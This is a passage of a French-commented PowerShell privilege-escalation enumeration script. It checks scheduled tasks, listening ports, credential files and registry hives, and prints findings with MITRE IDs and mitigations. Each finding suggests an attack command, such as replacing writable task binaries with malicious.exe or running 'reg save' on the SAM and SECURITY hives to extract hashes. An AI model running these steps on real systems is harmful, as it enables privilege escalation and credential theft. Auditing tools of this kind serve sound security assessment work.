                -Command 'Copy-Item malicious.exe "C:\ExcludedPath\"' `
                -Mitigation "Supprimer les exclusions non nécessaires"
        }
    }

    Write-Host "  Registre analysé" -ForegroundColor Gray
}

# ══════════════════════════════════════════════════════════════
#  MODULE 6 : TÂCHES PLANIFIÉES
# ══════════════════════════════════════════════════════════════
function Invoke-ScheduledTasksEnum {
    Write-Section "TÂCHES PLANIFIÉES"

    try {
        $tasks = Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" }
        $Global:Report.Scheduled = @()

        foreach ($task in $tasks) {
            $taskInfo = @{
                Name    = $task.TaskName
                Path    = $task.TaskPath
                State   = $task.State
                RunAs   = $task.Principal.UserId
                Actions = @()
            }

            foreach ($action in $task.Actions) {
                if ($action.Execute) {
                    $exePath = $action.Execute -replace '"', ''
                    $taskInfo.Actions += $exePath

                    # Script/binaire modifiable par l'utilisateur courant ?
                    if ($exePath -and (Test-Path $exePath)) {
                        $acl = Get-Acl $exePath 2>$null
                        if ($acl) {
                            foreach ($ace in $acl.Access) {
                                if ($ace.IdentityReference -match "Everyone|BUILTIN\\Users|Authenticated Users" `
                                    -and $ace.FileSystemRights -match "FullControl|Modify|Write") {
                                    Add-Finding -Category "ScheduledTasks" -Severity "HIGH" `
                                        -Title "Binaire de tâche planifiée modifiable : $($task.TaskName)" `
                                        -Description "Le binaire exécuté par la tâche '$($task.TaskName)' est modifiable. Remplacement → exécution en tant que $($task.Principal.UserId)." `
                                        -Evidence "Task: $($task.TaskName)`nBinary: $exePath`nRights: $($ace.FileSystemRights)`nRunAs: $($task.Principal.UserId)" `
                                        -Technique "T1053.005" `
                                        -Tools @("PowerUp","schtasks","icacls") `
                                        -Command "copy malicious.exe `"$exePath`" /Y" `
                                        -Mitigation "Corriger les ACL sur le binaire de la tâche"
                                }
                            }
                        }
                    }
                }
            }
            $Global:Report.Scheduled += $taskInfo
        }
        Write-Host "  $($tasks.Count) tâches planifiées analysées" -ForegroundColor Gray
    } catch {
        Write-Host "  Erreur énumération tâches planifiées" -ForegroundColor DarkYellow
    }
}

# ══════════════════════════════════════════════════════════════
#  MODULE 7 : RÉSEAU
# ══════════════════════════════════════════════════════════════
function Invoke-NetworkEnum {
    Write-Section "ÉNUMÉRATION RÉSEAU"

    $adapters    = Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object { $_.IPAddress -ne "127.0.0.1" }
    $routes      = Get-NetRoute -AddressFamily IPv4 -EA 0 | Sort-Object DestinationPrefix
    $connections = netstat -ano 2>$null
    $arpTable    = arp -a 2>$null
    $dnsCache    = Get-DnsClientCache -EA 0

    $Global:Report.Network = @{
        Adapters    = @($adapters | ForEach-Object { "$($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)" })
        Routes      = @($routes | ForEach-Object { "$($_.DestinationPrefix) via $($_.NextHop)" } | Select-Object -First 20)
        Connections = @($connections | Where-Object { $_ -match "LISTENING|ESTABLISHED" } | Select-Object -First 30)
        DnsCache    = @($dnsCache | Select-Object -ExpandProperty Name -First 20)
    }

    foreach ($adapter in $adapters) {
        Write-Host "  Interface: $($adapter.InterfaceAlias) - $($adapter.IPAddress)/$($adapter.PrefixLength)" -ForegroundColor White
    }

    # Ports locaux en écoute
    $listeningPorts = netstat -ano | Select-String "LISTENING"
    $dangerousPorts = @{
        "445"  = "SMB - Pass-the-Hash, PtT, WannaCry surface"
        "3389" = "RDP - Brute force, BlueKeep (CVE-2019-0708)"
        "5985" = "WinRM HTTP - Latéral movement"
        "5986" = "WinRM HTTPS - Latéral movement"
        "1433" = "MSSQL - xp_cmdshell, linked servers"
        "3306" = "MySQL - Enumération de DB, UDF injection"
        "8080" = "HTTP Alt - Jenkins, Tomcat, services web non sécurisés"
        "8443" = "HTTPS Alt - Services web avec certs auto-signés"
        "21"   = "FTP - Credentials en clair"
        "23"   = "Telnet - Credentials en clair"
        "389"  = "LDAP - Enumération AD non authentifiée possible"
        "636"  = "LDAPS - Enumération AD"
        "88"   = "Kerberos - AS-REP Roasting, Kerberoasting surface"
        "135"  = "RPC Endpoint Mapper - DCE/RPC attacks"
    }

    foreach ($port in $dangerousPorts.Keys) {
        if ($listeningPorts | Select-String ":$port\s") {
            Add-Finding -Category "Network" -Severity "LOW" `
                -Title "Port sensible en écoute : $port" `
                -Description $dangerousPorts[$port] `
                -Evidence "Port $port/TCP en LISTENING" `
                -Technique "T1049" `
                -Tools @("nmap","netstat") `
                -Command "netstat -ano | findstr :$port" `
                -Mitigation "Vérifier si ce service est nécessaire et correctement sécurisé"
        }
    }

    Write-Host "  Réseau énuméré" -ForegroundColor Gray
}

# ══════════════════════════════════════════════════════════════
#  MODULE 8 : FILESYSTEM & CREDENTIALS
# ══════════════════════════════════════════════════════════════
function Invoke-FileSystemEnum {
    Write-Section "FICHIERS SENSIBLES & CREDENTIALS"

    # ── Fichiers de config avec credentials ──
    $credPatterns = @{
        "web.config"          = "C:\inetpub"
        "appsettings.json"    = "C:\inetpub"
        "unattend.xml"        = "C:\Windows\Panther"
        "sysprep.xml"         = "C:\Windows\System32\Sysprep"
        "*.vnc"               = "C:\Users"
        "ConsoleHost_history.txt" = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine"
    }

    foreach ($pattern in $credPatterns.Keys) {
        $searchPath = $credPatterns[$pattern]
        $found = Get-ChildItem -Path $searchPath -Filter $pattern -Recurse -EA 0 | Select-Object -First 5
        foreach ($f in $found) {
            Add-Finding -Category "Credentials" -Severity "MEDIUM" `
                -Title "Fichier sensible trouvé : $($f.Name)" `
                -Description "Fichier potentiellement contenant des credentials : $($f.FullName)" `
                -Evidence "Path: $($f.FullName)" `
                -Technique "T1552.001" `
                -Tools @("findstr","Select-String","LaZagne") `
                -Command "Select-String -Path '$($f.FullName)' -Pattern 'password|passwd|pwd|secret|apikey'" `
                -Mitigation "Supprimer les credentials des fichiers de config"
        }
    }

    #Historique PowerShell
    $psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $psHistory) {
        $histContent = Get-Content $psHistory -EA 0 | Select-String -Pattern "password|pass|cred|secret|token|key" -CaseSensitive:$false
        if ($histContent) {
            Add-Finding -Category "Credentials" -Severity "HIGH" `
                -Title "Credentials potentiels dans l'historique PowerShell" `
                -Description "$($histContent.Count) ligne(s) suspecte(s) trouvée(s) dans l'historique PS" `
                -Evidence "Lines: $($histContent.Count) matches" `
                -Technique "T1552.003" `
                -Tools @("Get-Content","cat") `
                -Command "Get-Content '$psHistory'" `
                -Mitigation "Effacer l'historique PS et éviter de taper des credentials en clair"
        }
    }

    #Répertoires avec permissions faibles
    $checkPaths = @("C:\Windows\Temp", "C:\Temp", "C:\ProgramData", "$env:USERPROFILE")
    foreach ($path in $checkPaths) {
        if (Test-Path $path) {
            $acl = Get-Acl $path 2>$null
            foreach ($ace in $acl.Access) {
                if ($ace.IdentityReference -match "Everyone" -and $ace.FileSystemRights -match "Write|FullControl") {
                    Add-Finding -Category "FileSystem" -Severity "MEDIUM" `
                        -Title "Répertoire accessible en écriture par Everyone : $path" `
                        -Description "Ce répertoire peut être utilisé pour déposer des binaires malveillants ou abuser de DLL hijacking." `
                        -Evidence "$path - Everyone: $($ace.FileSystemRights)" `
                        -Technique "T1574.001" `
                        -Tools @("icacls","accesschk","PowerUp") `
                        -Command "icacls `"$path`"" `
                        -Mitigation "Restreindre les droits en écriture Everyone"
                }
            }
        }
    }

    #SAM/SYSTEM accessibles
    @("HKLM:\SAM", "HKLM:\SECURITY") | ForEach-Object {
        try {
            $key = Get-Item $_ -EA Stop
            Add-Finding -Category "Credentials" -Severity "CRITICAL" `
                -Title "Ruche registre accessible : $_" `
                -Description "L'accès direct à $_ permet d'extraire les hash NTLM locaux (SAM) ou les secrets LSA." `
                -Evidence "Accès confirmé à $_" `
                -Technique "T1003.002" `
                -Tools @("Mimikatz","impacket-secretsdump","reg save") `
                -Command "reg save $_ C:\Temp\dump.hiv" `
                -Mitigation "Vérifier les permissions sur les ruches SAM et SECURITY"
        } catch {}
    }

    Write-Host "  Système de fichiers analysé" -ForegroundColor Gray
}

# ══════════════════════════════════════════════════════════════
#  MODULE 9 : AFFICHAGE DU RAPPORT EN CONSOLE
# ══════════════════════════════════════════════════════════════
function Show-ConsoleReport {

    $findings = $Global:Report.Findings
    $critical = @($findings | Where-Object { $_.Severity -eq "CRITICAL" }).Count
    $high     = @($findings | Where-Object { $_.Severity -eq "HIGH"     }).Count
    $medium   = @($findings | Where-Object { $_.Severity -eq "MEDIUM"   }).Count
    $low      = @($findings | Where-Object { $_.Severity -eq "LOW"      }).Count
    $total    = $findings.Count
    $score    = $Global:Report.Score

    $riskLevel = if ($score -ge 100) { "CRITIQUE" }
                 elseif ($score -ge 60) { "ÉLEVÉ" }
                 elseif ($score -ge 30) { "MODÉRÉ" }
                 else { "FAIBLE" }
    $riskColor = if ($score -ge 100) { "Red" }
                 elseif ($score -ge 60) { "DarkRed" }
                 elseif ($score -ge 30) { "Yellow" }
                 else { "Green" }

    # ── Tableau de bord ──
    Write-Section "TABLEAU DE BORD"
    Write-Line "  Score de risque global : $score  ($riskLevel)" -Color $riskColor
    Write-Line "  Total findings          : $total"
    Write-Host ""
    Write-Line "  🔴 Critical : $critical    🟠 High : $high    🟡 Medium : $medium    🔵 Low : $low" -Color White

    # ── Identité & Tokens (récap) ──
    Write-Section "IDENTITÉ & TOKENS (Récapitulatif)"
    Write-Host "  Utilisateur : $($Global:Report.Identity.FullUser)"
    $enabledPrivs = @($Global:Report.Identity.Privileges.GetEnumerator() | Where-Object { $_.Value -eq "Enabled" })
    if ($enabledPrivs.Count -gt 0) {
        Write-Host "  Privilèges actifs :"
        foreach ($p in $enabledPrivs) {
            Write-Line "    - $($p.Key)" -Color Red
        }
    }
    if ($Global:Report.Identity.CurrentGroups -and $Global:Report.Identity.CurrentGroups.Count -gt 0) {
        Write-Host "  Groupes     : $($Global:Report.Identity.CurrentGroups -join ', ')"
    }

    # ── Système (récap) ──
    Write-Section "SYSTÈME (Récapitulatif)"
    Write-Host "  Hostname   : $($Global:Report.System.Hostname)"
    Write-Host "  OS         : $($Global:Report.System.OS) (Build $($Global:Report.System.Build))"
    Write-Host "  Domaine    : $($Global:Report.System.Domain)"
    Write-Host "  PSVersion  : $($Global:Report.System.PSVersion)"
    Write-Host "  Lang. Mode : $($Global:Report.System.CLMState)"

    # ── Réseau (récap) ──
    if ($Global:Report.Network.Keys.Count -gt 0) {
        Write-Section "RÉSEAU (Récapitulatif)"
        foreach ($a in $Global:Report.Network.Adapters) {
            Write-Host "  Interface : $a"
        }
    }

    # ── Services SYSTEM (récap) ──
    $sysServices = @($Global:Report.Services | Where-Object { $_.StartName -match "LocalSystem|SYSTEM" })
    if ($sysServices.Count -gt 0) {
        Write-Section "SERVICES TOURNANT EN SYSTEM ($($sysServices.Count))"
        foreach ($s in ($sysServices | Select-Object -First 25)) {
            Write-Host "  - $($s.Name)"
        }
        if ($sysServices.Count -gt 25) {
            Write-Host "  ... et $($sysServices.Count - 25) de plus"
        }
    }

    #Findings détaillés triés par sévérité
    Write-Section "FINDINGS DÉTAILLÉS ($total)"

    if ($total -eq 0) {
        Write-Line "  Aucun finding détecté." -Color Green
    }

    $sevOrder = @{ "CRITICAL"=0; "HIGH"=1; "MEDIUM"=2; "LOW"=3; "INFO"=4 }
    $sorted = $findings | Sort-Object { $sevOrder[$_.Severity] }

    $currentSev = $null
    foreach ($f in $sorted) {
        if ($f.Severity -ne $currentSev) {
            $currentSev = $f.Severity
            $hcolor = Get-SeverityColor $currentSev
            Write-Host ""
            Write-Line "  ── $currentSev ──────────────────────────────────────" -Color $hcolor
        }

        $color = Get-SeverityColor $f.Severity

        Write-Host ""
        Write-Line "  [$($f.Id)] $($f.Title)" -Color $color
        Write-Host "      Catégorie   : $($f.Category)   |   MITRE ATT&CK : $($f.Technique)"
        Write-Host "      Description : $($f.Description)"
        if ($f.Evidence)   { Write-Host "      Evidence    : $(($f.Evidence -replace "`n"," | "))" }
        if ($f.Tools)      { Write-Line "      Outils      : $($f.Tools -join ', ')" -Color Magenta }
        if ($f.Command)    { Write-Line "      Commande    : $($f.Command)" -Color DarkCyan }
        if ($f.Mitigation) { Write-Line "      Mitigation  : $($f.Mitigation)" -Color Green }
    }

    Write-Host ""
    Write-Section "FIN DU RAPPORT"
}

# ══════════════════════════════════════════════════════════════
#  POINT D'ENTRÉE PRINCIPAL
# ══════════════════════════════════════════════════════════════
Write-Banner

$Global:Report.Metadata = @{
    ToolName   = $TOOL_NAME
    Version    = $TOOL_VERSION
    StartTime  = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    RunBy      = "$env:USERDOMAIN\$env:USERNAME"
}

# Exécution des modules
Invoke-SystemEnum
Invoke-IdentityEnum
Invoke-LocalUsersEnum
Invoke-ServicesEnum
Invoke-RegistryEnum
Invoke-ScheduledTasksEnum

if (-not $SkipNetworkEnum) {
    Invoke-NetworkEnum
} else {
    Write-Host "`n  [i] Enumeration réseau ignorée (-SkipNetworkEnum)" -ForegroundColor DarkGray
}

Invoke-FileSystemEnum

# Affichage du rapport complet dans la console
Show-ConsoleReport

#Résumé console
$findings = $Global:Report.Findings
$critical = @($findings | Where-Object { $_.Severity -eq "CRITICAL" }).Count
$high     = @($findings | Where-Object { $_.Severity -eq "HIGH"     }).Count

Write-Section "RÉSUMÉ EXÉCUTIF"
Write-Host "  Score de risque : $($Global:Report.Score)" -ForegroundColor $(if($Global:Report.Score -ge 60){"Red"} elseif($Global:Report.Score -ge 30){"Yellow"} else {"Green"})
Write-Host "  Total findings  : $($findings.Count)" -ForegroundColor White
Write-Finding -Level "CRITICAL" -Message "Critical : $critical"
Write-Finding -Level "HIGH"     -Message "High     : $high"
Write-Finding -Level "MEDIUM"   -Message "Medium   : $(@($findings | Where-Object { $_.Severity -eq "MEDIUM" }).Count)"
Write-Finding -Level "LOW"      -Message "Low      : $(@($findings | Where-Object { $_.Severity -eq "LOW" }).Count)"
Write-Host ""
Write-Host "  Durée           : $([math]::Round(((Get-Date) - (Get-Date $Global:Report.Metadata.StartTime)).TotalSeconds, 1))s" -ForegroundColor Gray
Write-Host ""

if ($critical -gt 0) {
    Write-Host "  [!!!] EXPLOITATION IMMÉDIATE POSSIBLE - $critical vecteur(s) critique(s) identifié(s)" -ForegroundColor Red
}
